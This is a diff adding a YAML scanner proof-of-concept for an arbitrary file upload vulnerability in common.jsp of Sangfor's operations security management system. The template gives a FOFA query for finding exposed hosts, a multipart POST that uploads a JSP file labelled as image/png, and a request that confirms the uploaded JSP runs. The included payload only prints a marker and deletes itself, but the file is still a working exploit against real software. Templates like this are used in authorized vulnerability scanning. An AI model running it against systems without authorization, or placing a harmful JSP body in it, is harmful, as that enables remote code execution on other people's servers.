@@ -1,0 +1,31 @@
+id: poc-yaml-sangfor-osm-common-jsp-anyfile-upload
+info:
+  name: 深信服运维安全管理系统 common.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 深信服运维安全管理系统
+  fofa: body="/fort/login" && header="FORTSESSIONID"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /fort/trust/version/common/common.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+  data: '------geckoformboundaryf079b5206c15039ed1e6fe97927beff5
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/png
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------geckoformboundaryf079b5206c15039ed1e6fe97927beff5--'
+  expression: status_code == 200 && contains(body,"Upload success")
+- method: GET
+  path: /fort/trust/version/common/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
